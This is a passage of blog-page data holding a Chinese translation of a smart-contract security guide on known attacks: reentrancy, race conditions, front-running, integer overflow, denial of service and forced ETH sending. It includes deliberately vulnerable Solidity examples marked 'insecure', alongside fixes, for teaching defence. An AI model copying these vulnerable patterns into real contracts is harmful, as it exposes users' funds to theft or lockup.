class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\"></span><br><span class=\"line\">contract Auction &#123;</span><br><span class=\"line\">\taddress currentLeader;</span><br><span class=\"line\">\tuint highestBid;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction bid() payable &#123;</span><br><span class=\"line\">\t\trequire(msg.value &gt; highestBid);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\trequire(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tcurrentLeader = msg.sender;</span><br><span class=\"line\">\t\thighestBid = msg.value;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>当它试图退款给用户的时候，当退款失败，它会回滚。意思是一个恶意的竞标者可以通过让它们的退款<em>总是</em>失败而变成领导者。在这个方式中，它们可以防止其他任何人调用 <code>bid()</code> 函数，然后保证自己一直都是领导者。一个推荐是如之前所述，设置一个 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls\" target=\"_blank\" rel=\"noopener\">拉取支付系统</a> 来替代。</p>\n<p>另一个例子是当一个合约想要通过便利一个数组来支付给用户（如，在众筹合约中的支持者）。通常都想要确保每一笔支付都成功。如果没有的话，就回滚。这个问题是如果一个调用失败了，你就会回滚整个支付系统，那么循环将永远不会完成。因为一个地址强制错误所以没有人获得报酬。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">address[] private refundAddresses;</span><br><span class=\"line\">mapping(address =&gt; uint) public refunds;</span><br><span class=\"line\"></span><br><span class=\"line\">// bad</span><br><span class=\"line\">function refundAll() public &#123;</span><br><span class=\"line\">\tfor (uint x; x &lt; refundAddresses.length; x++) &#123; // // arbitrary length iteration based on how many addresses participated</span><br><span class=\"line\">\t\trequire(refundAddresses[x].send(refunds[refundAddresses[x]])) // doubly bad, now a single failure on send will hold up all funds</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>再一次，推荐的解决方法是 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls\" target=\"_blank\" rel=\"noopener\">赞成拉推支付</a>。</p>\n<h3 id=\"区块燃料限制导致的-DoS\"><a href=\"#区块燃料限制导致的-DoS\" class=\"headerlink\" title=\"区块燃料限制导致的 DoS\"></a>区块燃料限制导致的 DoS</h3><p>你可能注意到了之前的例子中的另一个问题：一次性支付给所有人，你会有触及区块燃料限制的风险。每一个以太坊区块都能处理一个确定的最大算力值。如果你想要超过它，那你的交易就会失败。</p>\n<p>即使没有故意的攻击，这也会造成问题。但是，如果攻击者可以操纵所需的燃料值，就会特别糟糕。在之前的例子中，攻击者可以添加大量地址，每一个都需要获得极销量的退款。攻击者的每一个地址退款操作的燃气消耗最终可能超过燃料限制，从而阻止退款交易的发生。</p>\n<p>这是另一个 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations#favor-pull-over-push-for-external-calls\" target=\"_blank\" rel=\"noopener\">赞成推拉支付</a> 的原因。</p>\n<p>如果你必须完全遍历一个你不知道大小的数组，那么你应该计划它可能需要多个区块，因而需要多个交易。你会需要对你当前的进度保持跟踪，并且能够从那个点恢复，就像下面这个例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Payee &#123;</span><br><span class=\"line\">\taddress addr;</span><br><span class=\"line\">\tuint256 value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Payee[] payees;</span><br><span class=\"line\">uint256 nextPayeeIndex;</span><br><span class=\"line\"></span><br><span class=\"line\">function payOut() &#123;</span><br><span class=\"line\">\tuint256 i = nextPayeeIndex;</span><br><span class=\"line\">\twhile (i &lt; payees.length &amp;&amp; msg.gas &gt; 200000) &#123;</span><br><span class=\"line\">\t\tpayees[i].addr.send(payees[i].value);</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tnextPayeeIndex = i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>你会需要确认在等待 <code>payOut()</code> 函数的下一个遍历的时候，如果其他交易被处理，不会有不好的事情发生。所以只在完全必要的时候使用这个模式。</p>\n<h3 id=\"强制将-ETH-发送到合约\"><a href=\"#强制将-ETH-发送到合约\" class=\"headerlink\" title=\"强制将 ETH 发送到合约\"></a>强制将 ETH 发送到合约</h3><p>可以不通过触发合约的 fallback 函数来强行将 ETH 发送到合约。当 fallback 函数内有重要的逻辑或者进行了基于合约余额的计算时，这是一个很重要的考虑。见下面的例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Vulnerable &#123;</span><br><span class=\"line\">\tfunction () payable &#123;</span><br><span class=\"line\">\t\trevert();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction somethingBad() &#123;</span><br><span class=\"line\">\t\trequire(this.balance &gt; 0);</span><br><span class=\"line\">\t\t// do something bad</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>合约逻辑看起来并不允许合约被支付，因此也不允许 “一些坏事” 发生。但是，存在一些强制发送 ETH 给合约的方法，因此它的余额大于 0。</p>\n<p>合约方法 <code>selfdestruct</code> 允许用户指定一个受益人发送多余的 ETH。<code>selfdestruct</code> <a href=\"https://solidity.readthedocs.io/en/develop/security-considerations.html#sending-and-receiving-ether\" target=\"_blank\" rel=\"noopener\">不会触发合约的 fallback 函数</a>。</p>\n<p>也可以<a href=\"https://github.com/Arachnid/uscc/tree/master/submissions-2017/ricmoo\" target=\"_blank\" rel=\"noopener\">预先计算</a>合约的地址，然后在合约部署之前给那个地址发送 ETH。</p>\n<p>合约开发者应该注意 ETH 可以被强制发送给合约并且应该设计相应的合约逻辑。通常来说，假设不可能限制你的合约的资金来源。</p>\n<h3 id=\"废弃的-历史的攻击\"><a href=\"#废弃的-历史的攻击\" class=\"headerlink\" title=\"废弃的 / 历史的攻击\"></a>废弃的 / 历史的攻击</h3><p>这些攻击由于协议的改变或固体的改进而不再可能发生。</p>\n<h4 id=\"调用深度攻击（废弃）\"><a href=\"#调用深度攻击（废弃）\" class=\"headerlink\" title=\"调用深度攻击（废弃）\"></a>调用深度攻击（废弃）</h4><p>在 EIP 150 的硬分叉中，调用深度攻击不再相关*（在达到 1024 调用深度限制之前，所有气体都将消耗得很好）。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"已知攻击\"><a href=\"#已知攻击\" class=\"headerlink\" title=\"已知攻击\"></a><a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/\" target=\"_blank\" rel=\"noopener\">已知攻击</a></h2><p>以下列出了你应该知道的已知攻击，并且在编写智能合约的时候进行防御。</p>\n<h3 id=\"竞争条件-Race-Conditions\"><a href=\"#竞争条件-Race-Conditions\" class=\"headerlink\" title=\"竞争条件(Race Conditions)\"></a><a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#footnote-race-condition-terminology\" target=\"_blank\" rel=\"noopener\">竞争条件</a>(Race Conditions)</h3><p>调用外部合约的一个主要危险之一是它会接管控制流，并且修改调用方法不被 期望修改的数据。这种类型的 bug 有很多形式，导致 DAO 崩溃的两个主要错误都是这类错误。</p>\n<h4 id=\"重入-Reentrancy\"><a href=\"#重入-Reentrancy\" class=\"headerlink\" title=\"重入(Reentrancy)\"></a>重入(Reentrancy)</h4><p>这个 bug 的第一个版本需要注意，这个函数可以在函数第一次调用完成之前重复调用。 这可能会导致函数的不同调用以破坏性方式进行交互。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\"></span><br><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdrawBalance() public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[msg.sender];</span><br><span class=\"line\">\trequire(msg.sender.call.value(amountToWithdraw)()); // At this point, the call&apos;s code is executed, and can call withdrawBalance again</span><br><span class=\"line\">\tuserBalances[msg.sender] = 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>因为用户余额直到最后被提取完才会被设置成 0，所以第二次（和更之后）的调用仍然会成功，从而一次又一次地提取余额。一个非常类似的 bug 是 DAO 攻击中的一个漏洞。</p>\n<p>在给出的例子中，避免这个问题的最好的办法是通过 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations#send-vs-call-value\" target=\"_blank\" rel=\"noopener\">使用 <code>send()</code> 代替 <code>call.value()()</code></a>。这会防止执行中的任何外部代码。</p>\n<p>然而，如果你不能移除外部调用，下一个简单地防止此攻击的方法是确保直到你完成了所有的内部工作之前都没有调用外部函数，你需要做：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdrawBalance() public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[msg.sender];</span><br><span class=\"line\">\tuserBalances[msg.sender] = 0;</span><br><span class=\"line\">\trequire(msg.sender.call.value(amountToWithdraw)());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>注意，如果你有另一个调用了 <code>withdrawBalance()</code>的函数，它可能会受到相同的攻击，所以你必须对调用了不可信合约的函数也视为不可信。请参阅下方的潜在解决方案的进一步讨论。</p>\n<h4 id=\"函数交叉竞争条件-Cross-function-Race-Conditions\"><a href=\"#函数交叉竞争条件-Cross-function-Race-Conditions\" class=\"headerlink\" title=\"函数交叉竞争条件(Cross-function Race Conditions)\"></a>函数交叉竞争条件(Cross-function Race Conditions)</h4><p>一个攻击者可能使用通过两个不同的函数共享一个状态来进行类似的攻击。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\"></span><br><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\"></span><br><span class=\"line\">function transfer(address to, uint amount) &#123;</span><br><span class=\"line\">\tif (userBalances[msg.sender] &gt;= amount) &#123;</span><br><span class=\"line\">\t\tuserBalance[to] += amount;</span><br><span class=\"line\">\t\tuserBalance[msg.sender] -= amount;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdrawBalance() public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[msg.sender];</span><br><span class=\"line\">\trequire(msg.sender.call.value(amountToWithdraw)()); // At this point, the caller&apos;s code is executed, and can call transfer()</span><br><span class=\"line\">\tuserBalances[msg.sender] = 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在这个例子中，当攻击者的代码在 <code>withdrawBalance()</code> 中的外部调用中被执行，攻击者会调用 <code>transfer()</code>。只要他们的余额不是 0，那么他们就可以在已经收到过一次提币的情况下，再次转移 token。这个漏洞也在 DAO 攻击中被使用。</p>\n<p>在相同的警告下，相同的解决方案也会起作用。也要注意，在这个例子中，函数都是同一个合约的一部分。但是，如果多个合约共享状态，那么相同的 bug 也可以出现在交叉的多重合约中。</p>\n<h4 id=\"竞争条件解决方案中的陷阱\"><a href=\"#竞争条件解决方案中的陷阱\" class=\"headerlink\" title=\"竞争条件解决方案中的陷阱\"></a>竞争条件解决方案中的陷阱</h4><p>因为竞争条件可以在多个函数，甚至多个合约中发生，所以任何旨在防止重入的解决方案都是不够的。</p>\n<p>相反，我们推荐在完成全部的内部工作之后再调用外部函数。如果你小心地遵循了这个规则，就可以避免竞争条件。但是，你不止要避免太早调用外部函数，也要避免调用了外部函数的函数。举例来说，下面是不安全的：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\">mapping(address =&gt; bool) private claimedBonus;</span><br><span class=\"line\">mapping(address =&gt; uint) private rewardsForA;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw(address recipient) public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[recipient];</span><br><span class=\"line\">\trewardsForA[recipient] = 0;</span><br><span class=\"line\">\trequire(recipient.call.value(amountToWithdraw)());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function getFirstWithdrawalBonus(address recipient) public &#123;</span><br><span class=\"line\">\trequire(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once</span><br><span class=\"line\"></span><br><span class=\"line\">\trewardsForA[recipient] += 100;</span><br><span class=\"line\">\twithdraw(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.</span><br><span class=\"line\">\tclaimedBonus[recipient] = true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>即使 <code>getFirstWithdrawalBonus()</code> 没有直接调用外部合约，<code>withdraw()</code> 内的调用已经足够产生一个竞争条件的漏洞。因此你不可以信任 <code>withdraw()</code> 函数。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mapping(address =&gt; uint) private userBalances;</span><br><span class=\"line\">mapping(address =&gt; bool) private claimedBonus;</span><br><span class=\"line\">mapping(address =&gt; uint) private rewardsForA;</span><br><span class=\"line\"></span><br><span class=\"line\">function untrustedWithdraw(address recipient) public &#123;</span><br><span class=\"line\">\tuint amountToWithdraw = userBalances[recipient];</span><br><span class=\"line\">\trewardsForA[recipient] = 0;</span><br><span class=\"line\">\trequire(recipient.call.value(amountToWithdraw)());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function untrustedGetFirstWithdrawalBonus(address recipient) public &#123;</span><br><span class=\"line\">\trequire(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once</span><br><span class=\"line\"></span><br><span class=\"line\">\tclaimedBonus[recipient] = true;</span><br><span class=\"line\">\trewardsForA[recipient] += 100;</span><br><span class=\"line\">\tuntrustedWithdraw(recipient); // claimedBonus has been set to true, so reentry is impossible</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>除了修复重入的问题，<a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#mark-untrusted-contracts\" target=\"_blank\" rel=\"noopener\">不受信任的函数也被标记了</a>。这个模式在每个层级都被重复使用：既然 <code>untrustedGetFirstWithdrawalBonus()</code> 调用了调用了外部合约的 <code>untrustedWithdraw()</code>，那么你就必须将 <code>untrustedGetFirstWithdrawalBonus()</code> 视作不安全的。</p>\n<p>另一个经常建议的解决方案是一个 <a href=\"https://en.wikipedia.org/wiki/Mutual_exclusion\" target=\"_blank\" rel=\"noopener\">互斥</a>。它允许你 “锁定” 某些状态，所以状态只能被锁的拥有者改变。一个简单的例子如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared state</span><br><span class=\"line\">mapping(address =&gt; uint) private balance;</span><br><span class=\"line\">bool private lockBalances;</span><br><span class=\"line\"></span><br><span class=\"line\">function deposit() payable public returns (bool) &#123;</span><br><span class=\"line\">\trequire(!lockBalances);</span><br><span class=\"line\">\tlockBalances = true;</span><br><span class=\"line\">\tbalances[msg.sender] += msg.value;</span><br><span class=\"line\">\tlockBalances = false;</span><br><span class=\"line\">\treturn true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw(uint amount) payable public returns (bool) &#123;</span><br><span class=\"line\">\trequire(!lockBalances &amp;&amp; amount &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);</span><br><span class=\"line\">\tlockBalances = true;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (msg.sender.call(amount)()) &#123;</span><br><span class=\"line\">\t\tbalances[msg.sender] -= amount;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlockBalances = false;</span><br><span class=\"line\">\treturn true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果用户试图在第一个调用结束前再次调用 <code>withdraw()</code>，锁就会防止其作用。这是一个有用的方式，但是当你有多个合约合作的时候，就会有一些困难。下面是不安全的：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\"></span><br><span class=\"line\">contract StateHolder &#123;</span><br><span class=\"line\">\tuint private n;</span><br><span class=\"line\">\taddress private lockHolder;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction getLock() &#123;</span><br><span class=\"line\">\t\trequire(lockHolder == 0);</span><br><span class=\"line\">\t\tlockHolder = msg.sender;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction releaseLock() &#123;</span><br><span class=\"line\">\t\trequire(msg.sender == lockHolder);</span><br><span class=\"line\">\t\tlockHolder = 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction set(uint newState) &#123;</span><br><span class=\"line\">\t\trequire(msg.sender == lockHolder);</span><br><span class=\"line\">\t\tn = newState;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>一个攻击者可以调用 <code>getLock()</code>，之后就永远不用调用 <code>releaseLock()</code>。如果他们这么干了，那么合约将被永远锁定，无法进行任何修改。如果你使用互斥来防止竞争条件，那么你需要小心地确认不会出现只能锁定而不能释放的情况。（使用互斥编程也有其他潜在的危险，如死锁和活锁。如果你想要使用这种方式，你应该查阅咨询大量互斥相关的文献资料。）</p>\n<h6 id=\"有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。-然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。\"><a href=\"#有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。-然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。\" class=\"headerlink\" title=\"有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。 然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。\"></a>有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。 然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。</h6><h3 id=\"交易顺序依赖（TOD）-前台运行\"><a href=\"#交易顺序依赖（TOD）-前台运行\" class=\"headerlink\" title=\"交易顺序依赖（TOD）/ 前台运行\"></a>交易顺序依赖（TOD）/ 前台运行</h3><p>以上的竞争条件示例涉及到攻击者在单笔交易中执行恶意代码。以下是区块链固有的一种不同类型的竞争条件：交易本身（在区块内）的顺序容易受到操纵。</p>\n<p>在被打包进区块之前，交易会进入内存池一段时间，因此可以知道交易在被打包之前有什么行为。对于像去中心化市场这类对象来说，这可能会有些麻烦，在这种市场中，可能看到买入 token 的交易，和其他交易被包含之前的市场顺序实现形式。防止这种情况很困难，因为它会涉及到具体合约本身。举例来说，在市场中，实施批量拍卖会更好（这也可以防止高频交易问题）。另一种方法是使用预先提交方案（“我将在稍后提交细节”）。</p>\n<h3 id=\"时间戳依赖\"><a href=\"#时间戳依赖\" class=\"headerlink\" title=\"时间戳依赖\"></a>时间戳依赖</h3><p>注意区块的时间戳可以被矿工操作，所以在不管是直接还是间接的对时间戳的使用中要多加考虑。</p>\n<p>有关与时间戳相关的设计注意事项，请参阅 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#timestamp-dependence\" target=\"_blank\" rel=\"noopener\">建议</a> 部分。</p>\n<h3 id=\"整数溢出和下溢\"><a href=\"#整数溢出和下溢\" class=\"headerlink\" title=\"整数溢出和下溢\"></a>整数溢出和下溢</h3><p>考虑一个简单的 token 转移：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mapping(address =&gt; uint256) public balanceOf;</span><br><span class=\"line\"></span><br><span class=\"line\">// insecure</span><br><span class=\"line\">function transfer(address _to, uint256 _value) &#123;</span><br><span class=\"line\">\t// check if sender has balance</span><br><span class=\"line\">\trequire(balanceOf[msg.sender] &gt;= _value);</span><br><span class=\"line\">\t// add and subtract new balances</span><br><span class=\"line\">\tbalanceOf[msg.sender] -= _value;</span><br><span class=\"line\">\tbalanceOf[_to] += _value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// secure</span><br><span class=\"line\">function transfer(address _to, uint256 _value) &#123;</span><br><span class=\"line\">\t// check if sender has balance and for overflows</span><br><span class=\"line\">\trequire(balanceOf[msg.sender] &gt;= _value &amp;&amp; balanceOf[_to] + _value &gt;= balanceOf[_to]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t// add and subtract new balances</span><br><span class=\"line\">\tbalanceOf[msg.sender] -= _value;</span><br><span class=\"line\">\tbalanceOf[_to] += _value;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果余额到达了 uint 值（2^256）的最大值，它会被置为零。这是检查这个条件。这可能有关也可能无关，取决于实现方式。考虑一下 uint 值是否有这个机会达到这么大的一个数字。考虑 uint 变量是如何改变状态的，并且谁有权限来做这样的改变。如果任意用户都可以更新 uint 值，那么就会有很多的攻击漏洞。如果只有一个管理者拥有权限来修改变量的状态，那你可能是安全的。如果一个用户每次尽能增加 1，那你也可能是安全的，因为并没有可行的方式来达到限制。</p>\n<p>对于下溢来说也是一样的。如果一个 uint 被设置成小于 0，这就会导致一个下溢然后被设置成它的最大值。</p>\n<p>对 uint8, uint16, uint24… 等更小的数据类型要小心：它们会更容易的达到它们的最大值。</p>\n<p>注意这里有大约 <a href=\"https://github.com/ethereum/solidity/issues/796#issuecomment-253578925\" target=\"_blank\" rel=\"noopener\">20 个关于溢出和下溢的例子</a></p>\n<h3 id=\"（不期望的）回滚导致的-DoS\"><a href=\"#（不期望的）回滚导致的-DoS\" class=\"headerlink\" title=\"（不期望的）回滚导致的 DoS\"></a>（不期望的）回滚导致的 DoS</h3><p>考虑一个简单的拍卖合约：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// insecure</span><br><span class=\"line\"></span><br><span class=\"line\">contract Auction &#123;</span><br><span class=\"line\">\taddress currentLeader;</span><br><span class=\"line\">\tuint highestBid;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction bid() payable &#123;</span><br><span class=\"line\">\t\trequire(msg.value &gt; highestBid);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\trequire(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tcurrentLeader = msg.sender;</span><br><span class=\"line\">\t\thighestBid = msg.value;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>当它试图退款给用户的时候，当退款失败，它会回滚。意思是一个恶意的竞标者可以通过让它们的退款<em>总是</em>失败而变成领导者。在这个方式中，它们可以防止其他任何人调用 <code>bid()</code> 函数，然后保证自己一直都是领导者。一个推荐是如之前所述，设置一个 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls\" target=\"_blank\" rel=\"noopener\">拉取支付系统</a> 来替代。</p>\n<p>另一个例子是当一个合约想要通过便利一个数组来支付给用户（如，在众筹合约中的支持者）。通常都想要确保每一笔支付都成功。如果没有的话，就回滚。这个问题是如果一个调用失败了，你就会回滚整个支付系统，那么循环将永远不会完成。因为一个地址强制错误所以没有人获得报酬。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 